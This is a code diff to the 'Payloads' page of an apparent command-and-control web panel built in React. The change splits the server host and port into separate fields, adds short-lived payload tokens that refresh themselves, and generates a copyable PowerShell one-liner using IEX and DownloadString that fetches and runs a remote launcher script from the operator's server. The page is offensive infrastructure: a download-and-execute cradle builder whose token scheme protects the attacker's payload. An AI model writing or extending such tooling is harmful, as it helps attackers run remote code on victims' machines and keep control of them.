@@ -2,35 +2,101 @@
 
 import { useEffect, useState } from 'react';
 import { Target, Copy, Check, Info, Rocket, Radio } from 'lucide-react';
+import { getPayloadToken } from '@/lib/api';
 
 export default function PayloadsPage() {
-  const [serverAddress, setServerAddress] = useState('');
+  const [serverHost, setServerHost] = useState('');
+  const [serverPort, setServerPort] = useState('8000');
   const [mode, setMode] = useState<'debug' | 'deployment'>('deployment');
   const [copied, setCopied] = useState(false);
+  const [configSource, setConfigSource] = useState<'env' | 'auto'>('auto');
+  const [payloadToken, setPayloadToken] = useState('');
+  const [tokenExpiresIn, setTokenExpiresIn] = useState(0);
 
-  // Auto-detect server address from current connection
+  // Fetch current valid payload token from server
+  const fetchPayloadToken = async () => {
+    try {
+      const data = await getPayloadToken();
+      setPayloadToken(data.token);
+      setTokenExpiresIn(data.expires_in);
+    } catch (error) {
+      console.error('Error fetching payload token:', error);
+      // API helper already handles 401 and redirects to login
+    }
+  };
+
+  // Load server configuration from env or auto-detect
   useEffect(() => {
-    const hostname = window.location.hostname;
-    const port = '8000'; // Default server port
-    setServerAddress(`${hostname}:${port}`);
+    const apiUrl = process.env.NEXT_PUBLIC_API_URL;
+
+    if (apiUrl) {
+      try {
+        // Parse the API URL to extract host and port
+        const url = new URL(apiUrl);
+        setServerHost(url.hostname);
+        setServerPort(url.port || '8000');
+        setConfigSource('env');
+      } catch (error) {
+        // Fallback to auto-detect if URL parsing fails
+        console.error('Failed to parse NEXT_PUBLIC_API_URL:', error);
+        setServerHost(window.location.hostname);
+        setServerPort('8000');
+        setConfigSource('auto');
+      }
+    } else {
+      // Fallback: auto-detect from browser
+      setServerHost(window.location.hostname);
+      setServerPort('8000');
+      setConfigSource('auto');
+    }
+
+    // Fetch initial token
+    fetchPayloadToken();
   }, []);
 
-  // Validate server address format (hostname:port or ip:port)
-  const isValidServerAddress = (address: string): boolean => {
+  // Auto-refresh token every 4 minutes (before 5-minute expiry)
+  useEffect(() => {
+    const refreshInterval = setInterval(() => {
+      fetchPayloadToken();
+    }, 4 * 60 * 1000); // 4 minutes
+
+    return () => clearInterval(refreshInterval);
+  }, []);
+
+  // Update countdown timer every second
+  useEffect(() => {
+    const countdown = setInterval(() => {
+      setTokenExpiresIn((prev) => Math.max(0, prev - 1));
+    }, 1000);
+
+    return () => clearInterval(countdown);
+  }, []);
+
+  // Validate server host format (hostname, domain, or IP)
+  const isValidServerHost = (host: string): boolean => {
+    if (!host || host.trim() === '') return false;
     // Strip any protocol prefix first
-    const cleaned = address.replace(/^https?:\/\//, '');
-    // Check for hostname:port or ip:port format
-    const pattern = /^[\w\.-]+:\d+$/;
+    const cleaned = host.replace(/^https?:\/\//, '').trim();
+    // Check for valid hostname, domain, or IP format
+    const pattern = /^[\w\.-]+$/;
     return pattern.test(cleaned);
   };
 
-  const addressValid = isValidServerAddress(serverAddress);
+  // Validate port number
+  const isValidPort = (port: string): boolean => {
+    const portNum = parseInt(port, 10);
+    return !isNaN(portNum) && portNum >= 1 && portNum <= 65535;
+  };
+
+  const hostValid = isValidServerHost(serverHost);
+  const portValid = isValidPort(serverPort);
+  const addressValid = hostValid && portValid;
 
   // Generate payload based on mode and server address
   const generatePayload = () => {
-    // Strip any http:// or https:// prefix from server address
-    const cleanAddress = serverAddress.replace(/^https?:\/\//, '');
-    const baseUrl = `http://${cleanAddress}/payload/launcher.ps1`;
+    // Strip any http:// or https:// prefix from server host
+    const cleanHost = serverHost.replace(/^https?:\/\//, '').trim();
+    const baseUrl = `http://${cleanHost}:${serverPort}/payload/launcher.ps1?id=${payloadToken}`;
 
     if (mode === 'debug') {
       return `powershell -c "IEX(New-Object Net.WebClient).DownloadString('${baseUrl}')"`;
@@ -72,32 +138,73 @@ export default function PayloadsPage() {
           Server Configuration
         </h2>
 
-        <label className="block text-sm text-gray-400 mb-2">
-          Server Address:
-        </label>
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+          {/* Server Address Field */}
+          <div className="md:col-span-2">
+            <label className="block text-sm text-gray-400 mb-2">
+              Server Address:
+            </label>
+            <input
+              type="text"
+              value={serverHost}
+              onChange={(e) => setServerHost(e.target.value)}
+              className={`w-full bg-gray-800 rounded px-4 py-2 text-white focus:outline-none transition-colors ${
+                hostValid || serverHost === ''
+                  ? 'border border-gray-700 focus:border-blue-500'
+                  : 'border-2 border-red-500 focus:border-red-400'
+              }`}
+              placeholder="192.168.1.10 or c2.example.com"
+            />
+            {!hostValid && serverHost !== '' && (
+              <p className="text-xs text-red-400 mt-1 flex items-center gap-1">
+                <Info className="w-3 h-3" />
+                Invalid host format
+              </p>
+            )}
+          </div>
 
-        <input
-          type="text"
-          value={serverAddress}
-          onChange={(e) => setServerAddress(e.target.value)}
-          className={`w-full bg-gray-800 rounded px-4 py-2 text-white focus:outline-none transition-colors ${
-            addressValid
-              ? 'border border-gray-700 focus:border-blue-500'
-              : 'border-2 border-red-500 focus:border-red-400'
-          }`}
-          placeholder="192.168.1.10:8000"
-        />
+          {/* Port Field */}
+          <div>
+            <label className="block text-sm text-gray-400 mb-2">
+              Port:
+            </label>
+            <input
+              type="number"
+              min="1"
+              max="65535"
+              value={serverPort}
+              onChange={(e) => setServerPort(e.target.value)}
+              className={`w-full bg-gray-800 rounded px-4 py-2 text-white focus:outline-none transition-colors ${
+                portValid
+                  ? 'border border-gray-700 focus:border-blue-500'
+                  : 'border-2 border-red-500 focus:border-red-400'
+              }`}
+              placeholder="8000"
+            />
+            {!portValid && (
+              <p className="text-xs text-red-400 mt-1 flex items-center gap-1">
+                <Info className="w-3 h-3" />
+                Port: 1-65535
+              </p>
+            )}
+          </div>
+        </div>
 
-        {addressValid ? (
-          <p className="text-xs text-gray-500 mt-2 flex items-center gap-1">
-            <Info className="w-3 h-3" />
-            Auto-detected from current connection
-          </p>
-        ) : (
-          <p className="text-xs text-red-400 mt-2 flex items-center gap-1">
-            <Info className="w-3 h-3" />
-            Invalid format. Use: hostname:port (e.g., 192.168.1.10:8000)
-          </p>
+        {addressValid && (
+          <div className="mt-3 space-y-1">
+            <p className="text-xs text-gray-500 flex items-center gap-1">
+              <Info className="w-3 h-3" />
+              {configSource === 'env'
+                ? 'Loaded from NEXT_PUBLIC_API_URL configuration'
+                : 'Auto-detected from current connection'}
+            </p>
+            {payloadToken && (
+              <p className="text-xs text-blue-400 flex items-center gap-1">
+                <Info className="w-3 h-3" />
+                Token-protected payload (expires in {Math.floor(tokenExpiresIn / 60)}:{(tokenExpiresIn % 60).toString().padStart(2, '0')})
+              </p>
+            )}
+          </div>
         )}
       </div>
 
@@ -141,9 +248,9 @@ export default function PayloadsPage() {
 
           <button
             onClick={handleCopy}
-            disabled={!addressValid}
+            disabled={!addressValid || !payloadToken}
             className={`absolute top-2 right-2 px-4 py-2 rounded flex items-center gap-2 transition-colors ${
-              addressValid
+              addressValid && payloadToken
                 ? 'bg-blue-600 hover:bg-blue-700 text-white cursor-pointer'
                 : 'bg-gray-700 text-gray-500 cursor-not-allowed'
             }`}
